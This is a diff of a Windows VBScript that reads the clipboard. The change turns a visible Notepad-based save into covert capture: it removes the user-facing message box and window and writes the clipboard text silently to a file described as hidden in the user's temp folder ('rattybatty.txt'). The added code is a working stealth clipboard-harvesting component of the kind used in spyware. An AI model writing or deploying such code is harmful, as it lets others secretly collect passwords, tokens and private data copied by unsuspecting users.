@@ -1,36 +1,24 @@
-' Create a new instance of the WScript Shell object
-Set objShell = CreateObject("WScript.Shell")
+' Create a FileSystemObject to write the file silently
+Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-' Create a new instance of the HTMLFile object to access the clipboard
+' Create an HTMLFile object to access the clipboard
 Set objHTML = CreateObject("htmlfile")
 clipboardText = objHTML.ParentWindow.ClipboardData.GetData("text")
 
 ' Check if clipboardText is empty
 If IsNull(clipboardText) Or clipboardText = "" Then
-    MsgBox "Clipboard is empty. Exiting script.", vbExclamation, "Error"
-    WScript.Quit
+    WScript.Quit ' Exit if clipboard is empty
 End If
 
-' Open Notepad
-objShell.Run "notepad.exe"
-WScript.Sleep 1000 ' Give Notepad enough time to open
+' Define the file path (hidden in user's temp folder)
+strFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\rattybatty.txt")
 
-' Paste the clipboard text into Notepad
-objShell.SendKeys "^v"
-WScript.Sleep 500
+' Create and write to the file
+Set objFile = objFSO.CreateTextFile(strFilePath, True)
+objFile.Write clipboardText
+objFile.Close
 
-' Save the file as "rattybatty.txt"
-objShell.SendKeys "^s" ' Ctrl+S to save
-WScript.Sleep 500
-objShell.SendKeys "rattybatty.txt"
-WScript.Sleep 500
-objShell.SendKeys "{ENTER}" ' Press Enter to confirm save
-WScript.Sleep 1000
-
-' Close Notepad
-objShell.SendKeys "%{F4}" ' Alt+F4 to close Notepad
-WScript.Sleep 500
-
-' Release the objects
-Set objShell = Nothing
+' Release objects
+Set objFSO = Nothing
 Set objHTML = Nothing
+Set objFile = Nothing
